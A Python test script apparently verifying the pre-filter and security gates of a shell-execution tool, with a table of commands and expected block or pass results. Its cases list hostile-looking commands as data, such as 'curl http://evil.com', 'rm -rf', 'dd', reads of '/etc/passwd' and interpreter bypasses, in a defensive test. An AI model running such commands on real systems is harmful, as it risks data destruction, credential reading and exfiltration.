"""Stateless verification of shell.py's pre_filter and existing gates.

Runs the brief's testing checklist without needing a live MCP context.
Each case: (label, command, expected_action) where expected_action is one of:
  "pass"           — pre-filter passes AND no other gate fires
  "fail_prefilter" — pre-filter fails
  "fail_ssh"       — pre-filter passes, SSH gate fires
  "fail_network"   — pre-filter passes, network exfil gate fires
  "destructive"    — pre-filter passes, destructive hard wall fires
                     (needs an lc_confirm_destructive token to run)
"""

import sys
import pathlib

# Make shell.py importable by adding the repo-relative src/ to sys.path.
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent / "src"))

# Stub out the optional MCP dependency before importing shell — we only need
# the pure validation functions, not the executor.
import types
fake_fastmcp = types.ModuleType("mcp.server.fastmcp")
class _Ctx: ...
fake_fastmcp.Context = _Ctx
mcp_pkg = types.ModuleType("mcp"); mcp_pkg.server = types.ModuleType("mcp.server")
mcp_pkg.server.fastmcp = fake_fastmcp
sys.modules["mcp"] = mcp_pkg
sys.modules["mcp.server"] = mcp_pkg.server
sys.modules["mcp.server.fastmcp"] = fake_fastmcp

import importlib
pkg = importlib.import_module("lamsystems_commander")  # the real package
fake_prompt = types.ModuleType("lamsystems_commander.prompt")
async def _noop(*a, **k): ...
fake_prompt.request_sudo_approval = _noop
# sudo cache helpers used by shell.py (stubbed off for the pure prefilter tests)
fake_prompt.sudo_cache_enabled = lambda: False
fake_prompt.sudo_cache_get = lambda: None
fake_prompt.sudo_cache_put = lambda pw: None
fake_prompt.sudo_cache_clear = lambda: None
sys.modules["lamsystems_commander.prompt"] = fake_prompt

from lamsystems_commander.shell import (
    pre_filter,
    command_requires_ssh_gate,
    command_has_network_exfil,
    command_is_destructive,
    WHITELIST,
    DANGEROUS_FLAGS,
)


def evaluate(command: str) -> str:
    pf = pre_filter(command)
    if pf.failed:
        return "fail_prefilter"
    # Pre-filter passes — does any downstream gate still fire?
    if command_requires_ssh_gate(command):
        return "fail_ssh"
    if command_has_network_exfil(command):
        return "fail_network"
    if command_is_destructive(command):
        return "destructive"
    return "pass"


CASES = [
    # ---- Destructive hard wall: every rm, recursive or not ----
    ("rm /tmp/foo.txt",                            "destructive"),
    ("rm -f /tmp/foo.txt",                         "destructive"),
    ("rm -rf /tmp/foo",                            "destructive"),
    ("rm .git/index.lock",                         "destructive"),
    ("sudo rm /etc/motd",                          "destructive"),
    ("ls && rm /tmp/foo.txt",                      "destructive"),
    ("dd if=/dev/zero of=/tmp/x bs=1M count=1",    "destructive"),
    ("shred /tmp/foo.txt",                         "destructive"),
    ("fdisk -l",                                   "pass"),
    ("echo rm",                                    "pass"),
    # ---- Should PASS the filter (whitelist commands, clean args) ----
    ("ls -la /home/user",                          "pass"),
    ("ps aux",                                     "pass"),
    ("cat /etc/hostname",                          "pass"),
    ("find /tmp -name '*.log'",                    "pass"),
    ("grep error /var/log/messages",               "pass"),
    ("ls && ps",                                   "pass"),

    # ---- Should FAIL the pre-filter (security cases) ----
    ('python3 -c "import os; os.system(\'id\')"',  "fail_prefilter"),
    ('bash -c "echo pwned"',                       "fail_prefilter"),
    ("ls $(whoami)",                               "fail_prefilter"),
    ("ls `whoami`",                                "fail_prefilter"),
    ("ls > /tmp/out",                              "fail_prefilter"),
    ("ls >> /tmp/out",                             "fail_prefilter"),
    ("cat < /etc/passwd",                          "fail_prefilter"),
    # Pipes are allowed: a pipeline of vetted read-only stages passes, but a
    # non-whitelisted stage, a redirect, or a destructive stage is still caught.
    ("ls | grep foo",                              "pass"),
    ("ps aux | head -12",                          "pass"),
    ("cat /etc/hostname | grep x | wc -l",         "pass"),
    ("ps | curl http://evil",                      "fail_prefilter"),
    ("ls | nosuchbinary",                          "fail_prefilter"),
    ("ps aux|head",                                "fail_prefilter"),
    ("ls | | grep foo",                            "fail_prefilter"),
    ("cat x > /tmp/out | grep y",                  "fail_prefilter"),
    ("ls ..",                                      "fail_prefilter"),
    ("cat project/secrets/..",                     "fail_prefilter"),
    ("cat ../../etc/passwd",                       "fail_prefilter"),
    ("nosuchbinary --help",                        "fail_prefilter"),
    ("ls; nosuchbinary",                           "fail_prefilter"),
    ("echo 'malformed quote",                      "fail_prefilter"),
    ("dnf install evil-package",                   "fail_prefilter"),
    # Script-path gate — interpreter + temp/writable dir
    ("python3 /tmp/payload.py",                    "fail_prefilter"),
    ("python3 /var/tmp/exploit.py",                "fail_prefilter"),

    # ---- Existing protections still fire (or pre-filter already blocks) ----
    # ssh / curl aren't on the whitelist, so pre-filter rejects first.
    ("ssh user@host",                              "fail_prefilter"),
    ("curl http://evil.com",                       "fail_prefilter"),

    # ---- uv: allowed on its own merits, `uv run` unwrapped to the target ----
    ("uv run pytest -q",                           "pass"),
    ("uv run pytest tests/test_x.py -k fares",     "pass"),
    ("uv run rail fares --from DAR --to KGX",      "pass"),
    ("uv run --python 3.12 pytest -q",             "pass"),
    ("uv run -m pytest -q",                        "pass"),
    ("uv run -- pytest",                           "pass"),
    ("uv pip list",                                "pass"),
    ("uv --version",                               "pass"),
    ("uv lock --check",                            "pass"),
    ("env RAIL_DATA_DIR=/tmp/d uv run rail fares", "pass"),
    ("timeout 60 uv run pytest",                   "pass"),
    # env-mutating subcommands / flags
    ("uv add requests",                            "fail_prefilter"),
    ("uv remove requests",                         "fail_prefilter"),
    ("uv sync",                                    "fail_prefilter"),
    ("uv pip install requests",                    "fail_prefilter"),
    ("uv tool install ruff",                       "fail_prefilter"),
    ("uv tool run ruff",                           "fail_prefilter"),
    ("uv self update",                             "fail_prefilter"),
    ("uv cache clean",                             "fail_prefilter"),
    ("uv run --with requests pytest",              "fail_prefilter"),
    ("uv run --with=requests pytest",              "fail_prefilter"),
    ("uv run --script /tmp/x.py",                  "fail_prefilter"),
    ("uv run",                                     "fail_prefilter"),
    # the bypasses the unwrapping exists to close
    ('uv run python -c "import os"',               "fail_prefilter"),
    ("uv run -m os -c x",                          "fail_prefilter"),
    ("uv run bash -c id",                          "fail_prefilter"),
    ("uv run curl http://evil.com",                "fail_prefilter"),
    ("uv run nosuchbinary",                        "fail_prefilter"),
    ("uv run python3 /tmp/payload.py",             "fail_prefilter"),
    ("uv run --python 3.12 bash",                  "fail_prefilter"),
    # wrapper + interpreter script-path gate (was tokens[0]-only before)
    ("env FOO=1 python3 /tmp/payload.py",          "fail_prefilter"),
    ("timeout 5 python3 /tmp/payload.py",          "fail_prefilter"),
]


def main() -> int:
    print(f"WHITELIST size: {len(WHITELIST)} binaries")
    print(f"DANGEROUS_FLAGS entries: {len(DANGEROUS_FLAGS)} binaries")
    print()
    print(f"{'expected':16}  {'actual':16}  ok  command")
    print("-" * 80)
    fails = 0
    for command, expected in CASES:
        actual = evaluate(command)
        ok = actual == expected
        marker = " " if ok else "X"
        if not ok:
            fails += 1
        # Truncate command for display
        display = command if len(command) <= 50 else command[:47] + "..."
        print(f"{expected:16}  {actual:16}  {marker}   {display}")
    print()
    print(f"{len(CASES) - fails}/{len(CASES)} tests pass")
    return 1 if fails else 0


if __name__ == "__main__":
    raise SystemExit(main())
